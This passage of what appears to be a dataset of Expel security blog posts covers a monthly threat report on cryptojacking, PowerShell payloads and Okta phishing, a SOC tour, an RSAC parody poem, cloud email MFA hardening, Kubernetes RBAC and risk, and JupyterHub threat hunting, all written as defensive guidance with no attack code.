running at their maximum capacity. This monitoring process can be streamlined in the cloud, with built-in solutions like AWS CloudWatch, Azure Monitor and GCP Cloud Monitoring. Resilience recommendations: Consider hiring a penetration tester to gain a better understanding of your external attack surface. Have computing resource alarms forwarded to your SIEM. Deploy an endpoint detection and response (EDR) tool on web servers. Scan and identify public-facing assets using Shodan . Ensure public web applications are patched to their latest version. Deploy a web application firewall (WAF). Attacker payloads often use PowerShell and the DotNet framework TL;DR: Malicious payloads deployed by threat actors take advantage of the PowerShell scripting language and DotNet framework built into the Windows operating system (OS) to obfuscate the true nature of the malware and avoid detection. In September, 83 percent of the malicious payloads we identified during incidents used the PowerShell scripting language and/or the DotNet framework. Both of these components are installed by default in modern versions of the Windows OS and provide different pathways for attackers to obfuscate the functionality of their malware. The SolarMarker Malware variant, which made up 33 percent of our identified malicious payloads, is a prime example of malware that uses these two Windows components. We observed a particular SolarMarker variant that was delivered as a Windows installer file. While its activity on the host was blocked before completion, analysis revealed that the malware first executed a series of PowerShell commands to generate an encoded file on the host. This file was then decoded in-memory into a valid DotNet module containing command and control logic that was then loaded and passed control. With the continued popularity of PowerShell and DotNet for attackers, consider the resilience recommendations below to prevent malware from being deployed on your systems through these vectors. Resilience recommendations: Consider implementing PowerShell Constrained Language Mode. Enable PowerShell Script Block Logging. Confirm your endpoint detection and response (EDR) coverage across all of your endpoints. Phishing Business Email Compromise (BEC) is still the top threat, but threat actors are looking beyond your inbox. TL;DR: BEC remained the top threat in September, but attackers are looking to compromise single sign-on (SSO) identity providers, as well. In September, 61 percent of the critical incidents we responded to were BEC  on par with previous months. Azure AD Identity Protection remained a strong signal for this type of compromise as the source for detecting 56 percent of the BEC incidents we identified. While weve covered the basics of BEC in our previous threat reports , we observed two notable trends in September that are worth calling out. The first was the use of a Python-based user agent when threat actors attempted to interact with a mailbox after a successful phishing attempt, seen in 5 percent of the BEC incidents. This stood out to us because threat actors typically spoof their user agents in an attempt to blend in, rather than using the default user agent supplied by their tool of choice, like the Python requests user agent seen in these incidents. This type of scripting language-based user agent presents a detection opportunity, especially if its prevalence continues to rise. Resilience recommendations: You know its coming  multi-factor authentication (MFA) for everything and everywhere. Conditional access policies are a great way to help mitigate geo infeasibility. Disable legacy protocols like IMAP and POP3 (these dont enforce MFA). Consider Azure AD Identity Protection to help identify suspicious mailbox logins. Bad actors are also going after cloud identity provider access. The second notable BEC trend we observed in September was attackers not only phishing for email access, but also trying to access a users cloud SSO provider. One of the critical incidents we responded to this month had an initial lead of several suspicious logins from the same IP. Further investigation revealed that phishing emails sent to the impacted users contained a link to a credential harvester for the popular SSO identity manager Okta. This wasnt our first time seeing threat actors attempt to gain access to Okta through phishing. While the threat actors in this particular incident used the harvested Okta credentials to log into Microsoft Office 365 (O365), compromising a users SSO credentials opens up a world of possibilities for an attacker to move into any application provisioned to that user. We think attackers were motivated by this opportunity, as all of the incidents we investigated in September involving cloud identity providers targeted Okta. Of note, weve also observed threat actors gaining access to Amazon Web Services (AWS) by way of Okta SSO access in previous months. Resilience recommendations: Implement phish resistant MFA (fido/webauthn). Enforce MFA prompts when users connect to sensitive apps through app-level MFA. Customize your Okta sign-in page appearances. If a user lands on a phony Okta sign-in page with no customization, it can help trigger their spidey-sense and let them know that something isnt right. Takeaways Phishing and BEC remain the hottest threats were observing and the most likely way an attacker will gain a foothold into your environment. Threat actors are continuing to target cloud SSO identity providers through phishing emails. While inboxes remain an enticing target, this type of access allows attackers to sign into a variety of applications including cloud providers like AWS, Azure and GCP. Enforcing MFA and disabling legacy protocols should be your first steps to protect against BEC. But when it comes to SSO identity providers, consider customizing your login page to help users visually detect when theyve opened a fake page like a credential harvester. Then apply additional MFA around any highly sensitive applications and access roles as a second line of defense. In the realm of malware, 80 percent of the public-facing vulnerability exploits we observed in September were used to deploy the XMRig cryptocurrency mining software. This isnt a coincidence given the recurring cryptocurrency activity weve seen this year. Start by following proper endpoint guidance, including EDR and patching, and understand your external attack surface to help prevent these exploits. Next, applications used to alert operations teams of overtaxed resources can also help security teams by indicating resources deployed for cryptojacking. Threat actors are also continuing to deploy malicious payloads that use the PowerShell scripting language and/or the DotNet framework. PowerShell Script Block Logging and constrained language mode can help detect and prevent threat actors using PowerShell. Well be back with insights on Octobers top attack vectors. In the meantime, have questions about this months data or what it means for your org? Drop us a note .'}) (input_keys={'title'}),
  Example({'title': 'Touring the modern SOC: where are the dials and blinking ...', 'url': 'https://expel.com/blog/touring-the-modern-soc-where-are-the-dials-and-blinking-lights/', 'date': 'Dec 5, 2022', 'contents': 'Subscribe  EXPEL BLOG Touring the modern SOC: where are the dials and blinking lights? Expel insider  3 MIN READ  JONATHAN HENCINSKI  DEC 5, 2022  TAGS: Tech tools When you think about taking a tour of a security operations center (SOC), what vision comes to mind? Some may see rows of desks with analysts eyes glued to computer screens, racks of servers, and other computing equipment. Perhaps theres a central hub, with lots of dials and blinking lights indicating security levels of the organizations various tools and services. They picture themselves walking around, taking in the unfamiliar sights, and leaning in to get a closer look. Maybe they ask a few questions and eventually decide, Yes, this is impressive. I feel secure. The reality of the modern Expel SOC tour is very different from this, mainly because SOC analysts are more likely to be remote and widely distributed geographically. While this means theres less chance of an impressive room where analysts are physically next to one another, it doesnt mean theyre any less effective. It simply means that our SOC tour takes a different form. At Expel, the tour starts with a discussion about mission . A key ingredient to high-performing teams is a clear purpose, and ours is to protect our customers and help them improve. This centers around problem solving and serving as a strategic partner. Were not just helping customers deal with incidents, were making recommendations on how to better prepare for future threats, how to improve processes and workflows, and where to make time and resource investments to boost overall security operations. Notice there are no mentions of trying to impress anybody with blinking lights. Thats intentional. Next, we talk about culture and guiding principles  key ingredients for any SOC. We think about culture as the behaviors and beliefs that exist when management isnt in the room. Culture isnt platitudes or memes on a PPT slide; culture is about behavior and intent. The key ingredients of our SOC culture are: We lead with technology Before we solve a problem, we own the problem Were a learning organization I dont know is always an acceptable answer Once we set a clear mission and mindset, we look at how our team is organized to meet the customers goals. Our 247 SOC is made up of defenders with varying levels of experience, and less experienced analysts are backed by seasoned responders. If we have a runaway alert (it happens), our team of detection and response (D&amp;R) engineers are ready to respond. And of course, our friendly bots, Josie and Ruxie, are there to support us. Josie detects and classifies alerts and enables us to make decisions about customers security signals, while Ruxie gathers critical information about threats so analysts dont have to. The SOC tour then shifts to operations management and how we at Expel do this for a living. We must have intimate knowledge of what our customers systems look like to know when an issue needs attention. With solid operations management in place, we can constantly learn from our analysts and operations for the decision moment. We watch patterns and make changes and adjustments to reduce manual effort. This allows us to hand off repetitive tasks to our bots so automation can unlock fast and accurate insights to inform decision-making. This ongoing optimization is one of the things that sets Expel apart. Next, our SOC tour focuses on how we think about investigations (which are really just narratives). When we identify an incident, we investigate to determine what happened, when it occurred, how it got there, and what we need to do about it. Investigations have all the elements of a great story, and we get to write the ending. Next, we talk about quality control in the SOC . We emphasize a few key points: We dont trade quality for efficiency We can measure quality in a SOC Quality control checks run daily based on a set of manufacturing ISOs to spot failures, so we can drive improvements What about results? We typically go from alert-to-fix in under 30 minutes, and were proud of that number. The result is driven by a high degree of automation and retention of SOC analysts. Some interesting statistics we recently gathered from our SOC team: Alert-to-fix time for critical incidents was 28 minutes 77% of alerts sent to the SOC were backed by automation Auto-remediation actions were completed in seven minutes The average tenure of SOC analysts is ~20 months Before the tour ends, we share insights . The security incidents we detect become insights for every customer. And we dont stop there; we curate these findings every three months for our Quarterly Threat Report, which surfaces the most significant data were seeing in our threat detection and response efforts. It buckets the data into trends that can affect your cybersecurity posture, and it offers resilience recommendations to protect your organization. (Have a free look at our Q3 Quarterly Threat Report here.) We then spend some time looking at the Expel Workbench , the platform where our SOC analysts work side-by-side with customers on investigations and remediation. This is where all that automation, SOC experience, operations management work, incident insight, and more comes together to detect, understand, and fix issues fast. Take a peak at the Expel Workbench here . Finally, we stop by the actual, virtual SOC. Most of our analysts are remote, but as we noted earlier, a SOC tour is about so much more than seeing a room with monitors. We believe a great SOC tour highlights the people, culture, and mindset behind the technology and processes that help keep our customers environments secure. We introduce you to the folks behind the curtain so you can see for yourself were a dedicated team  not just a bunch of blinking lights.'}) (input_keys={'title'}),
  Example({'title': "'Twas the Night Before RSAC - Expel", 'url': 'https://expel.com/blog/twas-night-rsac/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG Twas the Night Before RSAC Expel insider  3 MIN READ  MICHAEL J GRAVEN  APR 15, 2018 Twas the night before #RSAC , when all thro San Fran, No attacker was stirring, not even Shodan. The booths were all built, the swag was all there, In hopes that the hordes would actually care. The bankers were nestled all smug in their beds, While visions of IPOs danced in their heads. And Mon with her keynote and I with my lanyard, Id charged up my phone, and was here to get hammered; When out south of Market arose such a clatter, I whipped out my phone to see whats the matter. The threatcon was still a calm level two, Not Bears , or Kittens or Pandas . Then who? Dozens of vendor pleas, all trite and lame, They promised the moon, but used my wrong name. Please come to our booth! Get a shirt! Buy our things!! Both Gartner and Forrester think were the kings. Again. Delete. I banished their scrawl, Dashing away from the exhib-it hall. Then tward a party I flew like a moose, Tore past registration and downed a Grey Goose. When what did I spy in a sea of white men, But tech thats  advanced , has  ML , is  next-gen ! A sole data scientist, so wiry and sparse, I knew in a moment it must be a farce. And then there were some, like bears eyeing honey, Who saw all the CISOs and wanted their money; So up to the guests by the bar they all flew, With bags full of products and pitches, none true; Id finished my drink and was turning around, When I froze, cuz I had been run to ground; Badge scanner in hand, logo bag on his back, He looked like a wombat about to attack. His widget was scalable, unique and robust, Just buy it and go, theres no need to adjust. His droll little mouth was drawn up like a bow, And clearly he thought that hed earn lots of dough. He pulled out his phone and went straight to work, So when can we meet? it drove me berserk. But before I could blink or hide my badge code, He looked past my ear, and beyond me he strode; He spied someone else with more budget than me, And I realized that elsewhere is where I could be. I love what I do but I hate being prey, I had to stop pissing my budget away. I needed a break from the endless alerts, To fix what is wrong so it wouldnt get worse; Could I focus my time and my team on the things, That would bring some real value? Make customers sing? I dont want to live in a world thats so dark, Where truth and reality both jumped the shark. Its working on what is important to you, That keeps you from bidding security adieu. I decided to seek out the folks I could trust, To cover my backside while I readjust. The tools that you buy and the hashes you know Dont determine your happiness: win, place or show. So check out the talks in the con-fer-ence halls, And even some parties and cryptonerd balls; Then find, if you can, your security tribe, The people with whom you share the same vibe; Its there you will find your burden made light, Propelling you, arming you, into the fight. So with that I say, be you vendor or geek, Happy RSAC to all and to all a good week. Expel doesnt have a booth. We banned finger guns. Were at the conference, and if youd like to meet with us and talk about the way things could be  which our doggerel verse here hints at, naturally  head to http://info.expel.io/rsa2018 and grab a spot on our calendar. If you want to talk about Expel, great  if you want to abuse us about our terrible poetry, thats cool, too and if you just want some Tylenol, Gatorade and a bagel sandwich, hallelujah and well see you there. Weve been coming to this thing since it was still alternating between San Jose and San Francisco. And while the conference has changed a lot in the last fifteen years (in many ways lamentable), its still one of the best opportunities to get together with old friends, have a little fun and talk about how things could be. Expel makes space for you to do what you love. And one of the things we love is catching up with old friends and talking some shop. Hit us up. Michael Graven, +1 (612) 568-5772, michael.graven@expel.io Justin Bajko, +1 (703) 839-5240 , justin.bajko@expel.io Matt Peters, +1 (571) 215-0214, matt.peters@expel.io Peter Silberman, +1 (301) 943-0893, peter.silberman@expel.io'}) (input_keys={'title'}),
  Example({'title': "Two-Factor Authentication Doesn't Fully Secure Cloud Email", 'url': 'https://expel.com/blog/mfa-not-silver-bullet-to-secure-cloud-email/', 'date': 'Oct 2, 2019', 'contents': 'Subscribe  EXPEL BLOG MFA is not a silver bullet to secure your cloud email Security operations  5 MIN READ  ANDREW PRITCHETT AND ANTHONY RANDAZZO  OCT 2, 2019  TAGS: Get technical / How to / SOC / Vulnerability Remember the good ol days when you used to run your own email servers? Well, maybe they werent good days (Im looking at you, Exchange)  More and more orgs are transitioning from using traditional on-premise email solutions to cloud-based solutions like Microsofts Office 365 and Googles G Suite. (Fun fact: Microsoft Office 365 had 155 million business users as of last year.) And its easy to see why: you no longer have to support all of the required infrastructure or employ a team of individuals to service complicated Exchange deployments. The data is now hosted by a third party who is responsible for encrypting the data at rest, system availability, global delivery and developing and maintaining state of the art security protocols and services. While cloud-based email comes with some security benefits like hosted unified audit logging and modern authentication protocols  theyre still pretty new and heavily targeted by attackers. Cloud-based email systems are an easy way for the bad guys (or gals) to gain initial access into new environments or conduct other criminal activities. Youve probably heard that if you just enable a multi-factor authentication (MFA) solution, then everything will be sunshine and rainbows. And while MFA is a good step toward securing cloud-based email systems, its not a silver bullet. The reality is that MFA can be defeated by an attacker given the right resources and persistence. MFA should only be considered as one of the several security measures an organization should employ rather than the end-all-be-all. Regardless of whether you have MFA enabled or not, it is important to layer your security controls to strengthen your overall security posture. Even if your organization doesnt have the means to enable MFA, we highly recommend reading further to understand some additional risks to your cloud email environment and ways to reduce that risk. Disable legacy email protocols There are a bunch of email protocols and services in use today: Exchange Web Services (EWS), Messaging Application Programming Interface (MAPI), Exchange ActiveSync (EAS)  the list goes on . While most of these common email services and applications support MFA, some of the legacy email protocols dont. For example, the IMAP and POP email protocols are the two you should disable immediately. These protocols dont support MFA by default and will fully circumvent MFA with single-factor authentication. That means if an attacker phished the credentials of one of your users, then he or she can easily access that users entire inbox if authenticating via an IMAP or POP client (and trust us, this will probably be the first thing they try). Another big concern with IMAP and POP are that they expose too much data to the client application. Different clients have different sync settings by default and this determines how much of the mailbox is actually downloaded after a session is created. Attackers can obtain an entire copy of a users mailbox in order to search and parse offline for sensitive data. Another shortcoming with these protocols is that theres usually no logging available to determine exposure once you find an account compromise via IMAP or POP. In many circumstances, your security leaders would consider the entire mailbox exposed. G Suite usually has these protocols disabled by default. However, if somewhere along the road your admins enabled it for any of your users, its fairly simple to disable . O365 is another story, though. IMAP and POP are enabled by default and must be manually disabled across the tenant. If your user base is using IMAP or POP clients, particularly mobile clients, this could impact their ability to access email and may require them to authenticate with a new email client that supports MFA. As a helpful reminder, if you have multiple tenants, you will need to apply these actions to all of your tenants. If you determine that its catastrophic to end-user experience to get rid of these protocols on your tenant, then consider using global and conditional access policies to prevent employees from using these protocols under certain circumstances. (More on conditional access in a bit.) Disable basic authentication for all email protocols Is your orgs IAM team getting woken up in the wee hours of the night thanks to a ton of Azure Active Directory, G Suite or cloud IAM (Okta/Duo) account lockouts from unauthorized access attempts? Heres the primary culprit. (Youre welcome  and cheers to now getting a full nights sleep.) O365 currently has two implementations of authentication: basic authentication and modern authentication (Microsofts OAuth2). Because basic authentication is enabled by default, this allows older email clients that do not support modern authentication to bypass MFA as well. The protocols that allow for basic authentication in O365 are ActiveSync, Autodiscover, EWS, IMAP4, POP3, and authenticated SMTP. Now, even if youve disabled the IMAP and POP protocol as described in the previous section, the attacker can still attempt to authenticate (via credential stuffing, password spraying, or brute force), which in turn will create an abundance of account lockouts! Microsoft has released some good news though. In October 2020, they will no longer support basic authentication in O365, but in the meantime, you can disable basic authentication yourself. Remember that this could have a major impact your end-user experience, and may require using a different email client. On October 1, 2019, Microsoft released conditional access policies in audit-only mode , which can help measure this impact to users. If youre interested in the current use of IMAP/POP and other basic authentication sessions in O365, weve found that the user-agent string CBAInPROD is a pretty good indication of this activity. Check your Azure AD logs for signs of this if youre uncertain of your current Exchange configurations. It can be found in the ExtendedProperties of UserLoggedIn operations logs. G Suite also provides support for less secure apps (email clients). This too is disabled by default, but if you find it is enabled for users in your G Suite account, you can disallow sign-in from these apps. Enable conditional access policies Conditional Access enables administrators to apply policies (or multiple policies) to control who and what has access to apps in your environment. Conditional Access policies are enforced after the first-factor authentication has been completed but before the user is granted access to the environment. Therefore Conditional Access can evaluate multiple signals against your policies to determine success against certain pass/fail conditions. These signals include:  user and/or group membership  IP location information or ranges  users device type, state or use patterns  attempted access to applications  real-time and calculated risk detection as well as other features unique to each service provider If your org only services customers in one region of the U.S. and all of your employees reside and operate within the U.S., do you need to allow authentications from China, Russia and the Netherlands? Conditional access policies in O365 are another security measure which is relatively easy to enable and go a long way in supporting the effectiveness of MFA. Policies can be configured within an administrative session on the Azure Conditional Access tab. For G Suite, conditional access policies are most often configured via a third-party SSO agent or MFA client such as Okta and DUO respectively. Much like enabling MFA, whenever you make policy changes to authentication protocols, consider any adverse reactions to critical production systems and processes. We recommend making any of these changes in a phased roll out so that you can closely monitor changes for several days before implementing the next set of changes. Any one of these security measures will strengthen your security posture  but combined they complement each other to make your organization far more resilient against business email compromise (BEC) and unauthorized access.'}) (input_keys={'title'}),
  Example({'title': 'Understanding role-based access control in Kubernetes', 'url': 'https://expel.com/blog/understanding-role-based-access-control-in-kubernetes/', 'date': 'Oct 26, 2022', 'contents': 'Subscribe  EXPEL BLOG Understanding role-based access control in Kubernetes Security operations  5 MIN READ  DAN WHALEN  OCT 26, 2022  TAGS: Cloud security This article originally appeared on ContainerJournal.com and can be found here . Its reprinted here with permission. Im sorry Dave, Im afraid I cant do that.  HAL 9000, 2001: A Space Odyssey This iconic quote from 2001: A Space Odyssey is a great place to start if you want to understand authorization in Kubernetes. In the movie, of course, HAL is a rogue artificial intelligence; imagine for a moment that he was instead a simpler, rules-based system responsible for allowing or denying requests. An astronaut might ask HAL to perform a task, like turn off the lights or pressurize the airlock. HAL, operating in (hopefully) the best interests of the astronauts and their spacecraft, must decide whether the request is reasonable and if the action should be taken. HAL needs to evaluate each request against a set of internal rules that define who is authorized to execute what actions that impact which resources. This is authorization in a nutshell: a system of rules designed to determine whether or not something is allowed. Understanding authorization is critical to understanding how role-based access control (RBAC) works for securing Kubernetes. Whether youre a security professional starting to learn about Kubernetes or an engineer building with it, its important to understand the basic systems and rules that govern Kubernetes. RBAC in Kubernetes While Kubernetes technically supports other authorization modes, RBAC tends to be the de facto mode for access control these days. Understanding how it works will help users provision the permissions their teams need and avoid handing them out unnecessarily to those that dont need them. These concepts are especially useful as security pros think about managing risk in Kubernetes by enforcing least-privilege best practices. Before getting into specifics, there are a few core design principles worth calling out: Access is denied by default and permissions can only be added. A user cannot grant permission for something they do not have the permission to do themselves. This is a built-in mechanism to prevent privilege escalation. Because Kubernetes relies on a trust relationship with an external identity providersuch as an identity and access management (IAM) systemthere is no such thing as a Kubernetes user. The external identity provider is responsible for managing users, while Kubernetes simply ensures users can prove they are who they claim to be and checks whether they are authorized to perform the desired action. Resource Types for RBAC Configuration As with everything Kubernetes, configuring RBAC policy is just a matter of creating the right resources. In this case, there are four resource types that control authorization: Roles, ClusterRoles, RoleBindings and ClusterRoleBindings. While some of these may sound similar, there are important differences. Roles and RoleBindings grant access within the scope of a single namespace while ClusterRoles and ClusterRoleBindings are generally used to provide access across the entire cluster (though there are exceptions). Defining roles and role bindings is as simple as whipping up manifests in YAML. The schema for these resources is well documented in the official Kubernetes docs, but its important to understand how it works in practice. Below are a few examples to help illustrate the process: Example One: Granting Access to Read Pods for one Namespace Lets start with a simple examplean administrator needs to grant Dave access to get and list pods in a single namespace. They would start by creating a Role and RoleBinding that look something like this: Theyve created two resources: a Role called pod-viewer and a RoleBinding called pod-viewers. The role defines what actions (aka verbs) can be taken against what kinds of resources. The RoleBinding is what maps principals (in this case, only Dave) to that role. In this example, Dave can only get and list pods in the foo namespace. He will not be able to interact with any resources in the bar namespace. Example Two: Granting Cluster-Wide Access Now imagine the administrator wants Dave to be able to examine all pods in a cluster across all namespaces. One way to accomplish this is with a ClusterRole and ClusterRoleBinding, like so: At first glance, this may look similar to the previous example, but now Daves access isnt limited to the foo namespace. Because this results in broader, less restricted access, security analysts and engineers will correctly note that granting access across the entire cluster is risky. Generally speaking, its important to avoid over-provisioning permissions. Given the frequency with which todays attackers are engaging in identity theft, over-provisioning can cause serious damage if an identity is compromised. Example 3: Binding ClusterRoles to Specific Namespaces Some organizations have a lot of users and a lot of namespaces. To keep operations moving smoothly, they may want to grant a common set of permissions to users for their individual namespaces. Fortunately, that doesnt mean they need to create a Role resource for each namespace. In fact, they can bind a ClusterRole to a single namespace with a RoleBinding: In this example, they have used a namespaced RoleBinding to bind Dave to the pod-viewer role only in the foo namespace  which means he wont be able to access pods in other namespaces. This is functionally equivalent to the first example, the pod-viewer role can be reused across multiple namespaces. There is now one centralized place to manage a common set of permissions that can be used across a wide range of namespaces without granting users access to all of them. Not Everything in Kubernetes is Intuitive These basic tips can get users most of the way to understanding permissions in Kubernetes, but there are still a few specific intricacies that security professionals and engineers should understand. Aggregated ClusterRoles are one such example: Cluster role aggregation lets administrators add permissions to an existing ClusterRole without modifying the role itself. This is primarily used in situations where they need to add permissions to a default ClusterRole (like view or edit). While modifying the default role technically works, it can become problematic when upgrading clusters. Kubernetes can disrupt default role modifications, sometimes breaking required permissions. Fortunately, this can be avoided by aggregating additional permissions into an existing ClusterRole with a separate ClusterRole definition and a special annotation. While this sounds confusing, its surprisingly easy to visualize: In the example above, the pod-mgr role only provides permissions to get pods. However, its also aggregating any permissions from other ClusterRoles with the agg-pod-mgr label, so the effective permissions are get and list. Speaking of verbs, there are three uncommon verbs that nonetheless have an important effect on how authorization decisions are made in Kubernetes. At the risk of being overly dramatic, these verbs literally change the rules and are exceptions to some of the fundamental rules mentioned before. They are:  Bind . Bind is the exception to the earlier rule about a user not being able to grant permission they dont already have. The bind verb allows the user to create a role-binding resource even if they dont have the permissions for the targeted role. Security analysts should watch out for this verb, as its a common way to escalate privileges.  Escalate . By default, users cannot edit a role theyre already bound to in order to grant themselves additional privilegesa reasonable precaution. The escalate verb gives them permission to do just that, bypassing the Does this user already have these permissions? check that normally occurs when editing a role.  Impersonate . Impersonation is a mechanism that allows a user to run an API request acting as a different principal (user, group, service account). Its like the equivalent of the su command in Linux, but for Kubernetes. Typically, this verb is only used by highly privileged administrators to help debug permissions issues, so security professionals should scrutinize use of the impersonate verb to make sure there isnt an unexpected path to escalate privileges. Finally, its important to be aware of the asteriskalso known as the wildcard characterwhich may mean an action is granting more permissions than intended. For example, granting the * verb on ClusterRoles might seem safe because there are built-in privilege escalation prevention checks, but that is not the case. As covered above, this would grant bind and escalate access as well, for privilege escalation. Because of unintended consequences like this, the wildcard characters should only be used with care. Securing Kubernetes is Increasingly Essential Access control in Kubernetes is massively important, especially as Kubernetes becomes increasingly common for production and business-critical workloads. Understanding how RBAC authorization works is crucial for granting necessary permissions, but it remains important to avoid handing out more permissions than necessary and maintain a least-privilege mindset. Todays attackers are becoming increasingly savvy when it comes to exploiting overlapping permissions, misconfigurations, and stolen identities. Effective role-based access control in Kubernetes can help keep those exposures to a minimum.'}) (input_keys={'title'}),
  Example({'title': 'Understanding the 3 Classes of Kubernetes Risk', 'url': 'https://expel.com/blog/understanding-the-3-classes-of-kubernetes-risk/', 'date': 'Jan 30, 2023', 'contents': 'Subscribe  EXPEL BLOG Understanding the 3 Classes of Kubernetes Risk Security operations  1 MIN READ  DAN WHALEN  JAN 30, 2023  TAGS: Cloud security This article originally appeared on DarkReading.com and can be found here . Its reprinted here with permission. The first step toward securing Kubernetes environments is understanding the risks they pose and identifying the ways in which those risks can be mitigated. A few short years ago, not many people had heard of the word Kubernetes. Today, the open source container tool is becoming increasingly ubiquitous, with a rapidly growing number of businesses using Kubernetes to facilitate a more streamlined and scalable application development process. But as its convenience and scalability lead to greater adoption, protecting Kubernetes environments has become a challenge. Security and IT leaders who want to keep their Kubernetes environments secure must be aware of the three primary classes of risk they face  and how to mitigate them. Class 1: Accidental Misconfigurations Thus far, accidental misconfigurations have been the most common form of Kubernetes risk  the one most security experts are likely to be familiar with. Misconfigurations can occur anytime a user does something that unintentionally introduces risk into the environment. That might mean adding a workload that grants unnecessary permissions or accidentally creating an opening for someone from the anonymous Internet to access the system. Kubernetes is still relatively new to many, which means it can be easy to make mistakes. Fortunately, there are several ways to mitigate misconfigurations. Just about everything that happens in Kubernetes automatically produces an audit log, and security teams can monitor those logs for anomalous signs. Many businesses do this by sending the logs to a security information and event management (SIEM) platform, which can identify predetermined signs of misconfiguration. Additionally, tools (both paid and open source) are available that can be used to scan your Kubernetes environment for best practice violations. Once the problem is identified, an alert can be sent to the appropriate party and the problem triaged. To continue reading the rest of this article, visit DarkReading.com .'}) (input_keys={'title'}),
  Example({'title': 'Using JupyterHub for threat hunting? Then you should ...', 'url': 'https://expel.com/blog/jupyterhub-threat-hunting-8-tricks/', 'date': 'Nov 19, 2019', 'contents': 'Subscribe  EXPEL BLOG Using JupyterHub for threat hunting? Then you should know these 8 tricks. Security operations  8 MIN READ  ANDREW PRITCHETT  NOV 19, 2019  TAGS: Get technical / How to / Hunting / SOC / Tools Test, learn, iterate is a mantra thats often repeated around the Expel office. Im not sure exactly how Test, learn, iterate became a thing, but if I had a dollar for every time Jon Hencinski said it, Id be living large on a private island somewhere. One of the services we offer here at Expel is threat hunting , and earlier this year our team set out to enhance our existing offering. Lets build a new tool within our existing ecosystem to better support hunting, we decided. Building a better threat hunting tool Of course building a new tool is no small feat. Before we put hands to keyboards, we needed to define what a better threat hunting tool would look like. What new features and capabilities do our customers want? What kind of data will we need to interface with? How will the analysts interact with that data? What kind of workflows will allow us to be more productive? How do we define and measure that increase in productivity? The backbone of our existing threat hunting ecosystem is Expel Workbench  thats our one-stop-shop for our analysts to triage alerts, investigate incidents and communicate important info to our customers. While our hunting tools need to be baked into Expel Workbench, experimentation and rapid dev practices are out of the question in that environment. The experimentation dilemma Because experimenting directly in Expel Workbench can impact customers and the SOC, we started brainstorming other ways to iterate and test our new code that wouldnt impact the day-to-day functionality of the system. A few of us started using Jupyter Notebook as a training and development aid to assist analysts in learning new hunting techniques and providing decision support. If you arent familiar, Jupyter Notebook offers an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and narrative text. We decided that if a Jupyter Notebook can provide structure to a workflow and decision support for analysts, why couldnt we inject the data into the workflow and pair the data output with the decision support? Using JupyterHub for threat hunting To also address our need for rapid development, process isolation and ease of access for our analysts, we soon decided that using JupyterHub was a good approach  its a multi-user server designed for Jupyter Notebook. (If you want to learn more about JupyterHub, why we like it so much and the tips and tricks we learned along the way, check out this post:  Our journey to JupyterHub and beyond. ) Jupyter Notebook gave us the freedom to rethink the way we analyzed data that was collected for hunting. Instead of only providing analysts with one large output of data to review, such as a CSV of results, we can now enrich the data with additional context from other events and partner APIs, we can graph or plot the data for visualizations and we can combine other references or artifact lookups into the interface where the analyst has quick and easy access. Image: Example of references, artifact lookups and event enrichment from an Amazon Web Services (AWS) hunt. If youre curious about using JupyterHub for threat hunting decision support in your own org, here are a couple tips weve learned and implemented that might be helpful to you and your team as you get up and running: Use a template-based deployment design If youre like us, youve got many different hunting techniques and are always looking to add more to your library. A template acts as a chassis that has all of the necessities baked into it. We decided to engineer a fully customizable chassis that is configurable by a YAML config file. This gives non-engineering folks the ability to self-service the creation of new hunting techniques. In our ecosystem at Expel, we love to crowdsource our workloads across teams. The more people who can contribute to new hunt techniques, the faster we can turn out more high-quality hunts. Our hunting template includes the ability to: Authenticate and interact with our Workbench API Ingest and normalize data from multiple source types and devices Enrich customer hunting data with approved third-party intel APIs Tag and annotate important or noteworthy data Suppress irrelevant or false positive data Sort, filter and search of all data in the hunt Relevant references, graphs, charts and tables for further context Report stats such as time to complete a hunt, number of findings Generate audit trails, such as what data is being suppressed or reported Add raw data to a formatted findings report in Workbench Image: Example of sort, filter, search of all data in the hunt from an AWS hunt. Create a method for capturing and reporting user stats Its tough to get users to provide you with quality feedback. Everyone is busy and wants to be helpful but honest, quality feedback is hard to come by and in general response rates are often low. We do have a process for collecting feedback, feature requests and bugs; however, if you collect lots of user metrics, your results will start to tell a story and guide you toward whats working and whats not  without ever having to bug your users to share their feedback. If you build this into your template early, you can standardize on the stats youre going to have in all of your future technique deployments. This is absolutely key if you want to test, learn and iterate. The majority of what we learn comes from trends we discover in our metrics  and then were able to easily make adjustments to our processes based on what we learn from our users. Image: Example graph from our metrics notebook. Dont forget about enrichment Enrichment is key to a successful hunting program. Enrichment is taking an artifact and using it to derive additional information or context. For example, from an IP address artifacts, we can enrich it to find out the geolocation or its origin, the owning organization, whether the owning organization is an ISP or a hosting provider. With this additional information, we can now draw new conclusions from our IP address artifact. Raw logs for two different logon events will appear nearly identical at first review to an analyst. However, if you add enrichment data  like the owning organization of the source IP address, the geo-location of the source IP address or whether the IP address is associated with TOR or a datacenter  all of a sudden the data becomes dimensional and anomalies start to stand out. Theres tremendous value in tags, annotation and suppression From month to month, environments change because of administrative updates, software updates and patches. Sometimes well conduct a well-established hunt technique, yet we get unexpected results due to recent changes in the environment. We found its invaluable to give analysts the ability to tune the hunt on the fly. Additionally, sharing information between analysts from hunt to hunt and month to month has proved to be valuable, too. For example, if an analyst confirms that its normal for Employee A at Organization Y to frequently log in from both the New York City and London offices, then the analyst can tag this type of activity. Then other analysts conducting future hunts dont need to repeat the same investigative legwork later, only to arrive at the same business as usual conclusion. Allow for internal auditing Our tags and suppressions help us deliver efficient hunting results. Thats why we built a special notebook just for auditing all our tags and suppressions. Senior analysts regularly review our tags and suppressions for accuracy and quality. Since we already have a regular cadence for quality assurance, we decided to also pull a sample set of findings reports into this notebook in order to review and improve our final delivery formats for our customers. This helps us all learn and improve, and allows us to iterate on our processes and deliverables to better serve our customers. Image: Preview of our quality assurance and audit notebook. Embrace downselects Downselects are what we call the smaller subsets of data that focus on a key aspect of the technique or generate a frequency count. Downselects can be reference links, graphs, charts, timelines, tables or a mini stats report. We found that its great to have a few on each hunt; however, we also discovered that too many can be distracting and cause an analyst to feel disconnected from the overarching technique. Were still iterating on this one, and will report back soon (maybe even with a follow-up blog post). Image: Example of a mini stats report from an AWS hunt. Image: Example of a graph from an AWS hunt. Consistency can help drive efficiency At Expel, we strive to give all our customers a tailored experience. But there needs to be a careful balance between customization and consistency in order to drive efficiency. Weve chosen to have our analysts write unscripted, detailed messages to our customers regarding items identified in a findings report. Many other MSSPs and MDRs automate these. However, to maintain efficiency and a higher standard of delivery, we decided to import the analysts message into the code and format the overall findings report. Also, instead of having a custom set of downselects written for 